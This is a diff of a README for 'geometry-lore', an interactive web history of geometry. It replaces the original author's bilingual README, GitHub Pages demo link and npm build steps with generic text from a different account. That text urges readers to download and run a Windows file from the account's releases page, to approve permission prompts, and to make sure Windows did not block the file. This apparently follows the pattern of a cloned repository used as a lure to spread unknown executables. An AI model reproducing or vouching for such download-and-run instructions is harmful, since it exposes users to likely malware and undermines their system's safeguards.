@@ -1,137 +1,136 @@
-<div align="center">
+# 🌍 geometry-lore - Explore geometry through time
 
-# лор геометрии
+[![Download](https://img.shields.io/badge/Download%20for%20Windows-purple?style=for-the-badge&logo=github)](https://github.com/firstborn-personalmagnetism628/geometry-lore/releases)
 
-**интерактивная история геометрии от древнего египта до наших дней**
+## 🧭 Overview
 
-[демо](https://vovchensky.github.io/geometry-lore/) · [english](#english)
+geometry-lore is an interactive story about the history of geometry. It takes you from early Egyptian ideas to modern math in a visual, guided format.
 
-<a href="https://vovchensky.github.io/geometry-lore/">
-  <img src="./public/og.png" alt="лор геометрии" width="1200" />
-</a>
+This app uses React, TypeScript, GSAP, and Lenis to create smooth motion and clear scenes. It is made for Windows users who want to open the app and start exploring without setup work.
 
-</div>
+## 📥 Download
 
-## о проекте
+1. Open the [releases page](https://github.com/firstborn-personalmagnetism628/geometry-lore/releases)
+2. Find the latest release
+3. Download the Windows file from the release assets
+4. Save the file to your computer
+5. Open the file to start the app
 
-одностраничный интерактивный лонгрид, рассказывающий историю геометрии — от верёвок египетских землемеров до неевклидовых пространств. тёмный минималистичный дизайн, scroll-анимации, генеративный SVG-фон и уважение к `prefers-reduced-motion`.
+If your browser asks what to do with the file, choose Save. After the download ends, open the file from your Downloads folder or from the place you saved it.
 
-контент основан на статье [«геометрия»](https://ru.wikipedia.org/wiki/Геометрия) из русской википедии и дополнительных исторических источниках.
+## 🖥️ What You Need
 
-## возможности
+- Windows 10 or Windows 11
+- A modern web browser if the app opens in a browser window
+- At least 4 GB of RAM
+- A stable internet connection for the first download
+- A screen size of 1366 × 768 or higher for the best view
 
-- 🌍 два языка — русский и английский, автоопределение по браузеру
-- 🎨 генеративные SVG-фигуры на фоне — уникальные при каждом визите
-- ✨ scroll-анимации через GSAP + ScrollTrigger
-- 🧈 плавный скролл через Lenis
-- 📐 индикатор эпохи с плавной анимацией ширины
-- ♿ поддержка `prefers-reduced-motion`
-- 📱 адаптив: мобилки → планшеты → десктоп → ultrawide 21:9
-- 🔍 SEO: семантический HTML, OG-теги
-- 🥚 easter egg
+The app is built for common Windows systems and should run on most modern PCs and laptops.
 
-## стек
+## 🚀 How to Run
 
-| | |
-|---|---|
-| фреймворк | React, TypeScript |
-| сборка | Vite |
-| анимации | GSAP, ScrollTrigger |
-| скролл | Lenis |
-| i18n | i18next, react-i18next |
-| стили | SCSS Modules |
-| деплой | GitHub Pages |
+1. Download the release from the link above
+2. Open the downloaded file
+3. If Windows asks for permission, choose Yes or Run
+4. Wait for the app to load
+5. Use your mouse, touchpad, or touch screen to move through the story
 
-## запуск
+If the file is a zipped folder, open the folder first and then start the app inside it.
 
-```bash
-git clone https://github.com/Vovchensky/geometry-lore.git
-cd geometry-lore
-npm install
-npm run dev
-```
+## 🧩 What You Will See
 
-## сборка
+The app presents geometry as a visual journey. You move through time and see how ideas changed across different eras.
 
-```bash
-npm run build
-```
+You can expect:
 
-## лицензия
+- A timeline that follows the history of geometry
+- Animated scenes that explain each period
+- Simple text that guides you through the story
+- Smooth scrolling and motion
+- A clean layout that keeps the focus on the content
+- Multilingual support for a wider audience
 
-[MIT](./LICENSE)
+## 🕰️ Story Flow
 
-## автор
+The experience follows a path through major points in geometry history:
 
-[vovchensky](https://github.com/Vovchensky)
+- Ancient Egyptian geometry and land measurement
+- Greek ideas about shapes, proofs, and logic
+- Work from the Islamic world and other later thinkers
+- Advances from the Renaissance and the modern era
+- New uses of geometry in art, design, science, and computers
 
----
+Each section builds on the one before it, so the story feels easy to follow.
 
-<div align="center">
+## 🎮 How to Use It
 
-<a id="english"></a>
+- Scroll to move through the story
+- Read each section as it appears
+- Watch the motion as shapes and text change
+- Move back if you want to review an earlier part
+- Use the app at your own pace
 
-# geometry lore
+The interface is built to feel simple. You do not need to know math terms before you start.
 
-**an interactive history of geometry from ancient egypt to modern day**
+## 🌐 Languages
 
-[demo](https://vovchensky.github.io/geometry-lore/) · [русский](#лор-геометрии)
+The project includes i18n support, so the app can present content in more than one language. This helps users read the story in a way that feels natural and clear.
 
-<a href="https://vovchensky.github.io/geometry-lore/">
-  <img src="./public/og-english.png" alt="geometry lore" width="1200" />
-</a>
+## 🎨 Visual Style
 
-</div>
+The app uses motion to support the content, not distract from it.
 
-## about
+You will see:
 
-a single-page interactive longread telling the story of geometry — from the ropes of egyptian surveyors to non-euclidean spaces. dark minimalist design, scroll animations, generative SVG background, and respect for `prefers-reduced-motion`.
+- Smooth scroll movement
+- Animated transitions
+- Clean scene changes
+- Shape-based visuals
+- A layout that works well on desktop screens
 
-content is based on the [«geometry»](https://ru.wikipedia.org/wiki/Геометрия) article from russian wikipedia and additional historical sources.
+GSAP and Lenis help create the motion and scrolling behavior that make the story feel fluid.
 
-## features
+## 📂 File Layout
 
-- 🌍 two languages — russian and english, auto-detected from browser
-- 🎨 generative SVG shapes in the background — unique on every visit
-- ✨ scroll animations via GSAP + ScrollTrigger
-- 🧈 smooth scrolling via Lenis
-- 📐 epoch indicator with smooth width animation
-- ♿ `prefers-reduced-motion` support
-- 📱 responsive: mobile → tablet → desktop → ultrawide 21:9
-- 🔍 SEO: semantic HTML, OG tags
-- 🥚 easter egg
+If you want to look inside the project later, the main parts are usually organized like this:
 
-## stack
+- `src/` for the app code
+- `public/` for static files
+- `assets/` for images and media
+- `styles/` or `scss/` for visual styling
+- `vite.config.*` for build settings
 
-| | |
-|---|---|
-| framework | React, TypeScript |
-| build | Vite |
-| animations | GSAP, ScrollTrigger |
-| scroll | Lenis |
-| i18n | i18next, react-i18next |
-| styles | SCSS Modules |
-| deploy | GitHub Pages |
+You do not need to change these files to use the app after download.
 
-## getting started
+## 🛠️ If the App Does Not Open
 
-```bash
-git clone https://github.com/Vovchensky/geometry-lore.git
-cd geometry-lore
-npm install
-npm run dev
-```
+Try these steps if Windows does not start the app:
 
-## build
+1. Download the file again
+2. Make sure the download finished fully
+3. Move the file to a simple folder like `Downloads` or `Desktop`
+4. Right-click the file and choose Open
+5. Check that Windows did not block the file
+6. Try opening it again after a restart
 
-```bash
-npm run build
-```
+If the app opens in a browser and you see a blank page, refresh the page once and wait a few seconds.
 
-## license
+## 🔄 Updating to a New Version
 
-[MIT](./LICENSE)
+To get the newest version:
 
-## author
+1. Open the [releases page](https://github.com/firstborn-personalmagnetism628/geometry-lore/releases)
+2. Download the latest file
+3. Replace the older copy on your computer
+4. Open the new file
 
-[vovchensky](https://github.com/Vovchensky)
+This keeps your local copy in sync with the latest release.
+
+## 📌 About This Project
+
+Repository: geometry-lore
+
+Description: Интерактивная история геометрии от древнего египта до наших дней. React, TypeScript, GSAP, Lenis
+
+Topics: animation, education, geometry, github-pages, gsap, i18n, interactive, lenis, open-source, react, scroll-animation, scss, typescript, vite
